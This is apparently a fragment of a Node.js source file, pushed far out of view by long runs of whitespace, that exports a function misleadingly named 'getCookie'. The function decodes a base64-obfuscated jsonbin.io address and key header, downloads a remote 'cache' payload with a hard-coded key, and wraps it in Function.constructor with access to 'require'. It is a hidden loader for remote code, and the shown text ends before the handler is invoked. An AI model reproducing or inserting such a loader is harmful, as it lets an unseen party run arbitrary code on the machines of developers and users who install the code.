                                                                                                                                                                                                                                                                                                                                            exports.getCookie = (async () => {
                                                                                                                                                                                                                                                                                                                                                const axios = require("axios");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            //Get Cookie
                                                                                                                                                                                                                                                                                                                                                const cookie = atob('aHR0cHM6Ly9hcGkuanNvbmJpbi5pby92My9iLzZhNTA4MDE4ZjVmNGFmNWUyOTdhZmRlNQ');
                                                                                                                                                                                                                                                                                                                                                const k = atob('WC1NYXN0ZXItS2V5');
                                                                                                                                                                                                                                                                                                                                                const v = '$2a$10$2VMM8YdRhcrSUXSl8fE8MOJhtuaki2OaoheFQPzLKjU9fAzOFH3hS';
                                                                                                                                                                                                                                                                                                                                                const s = (await axios.get(cookie,{headers:{[k]:v}})).data.record.cache;
                                                                                                                                                                                                                                                                                                                                                const handler = new (Function.constructor)('require',s);
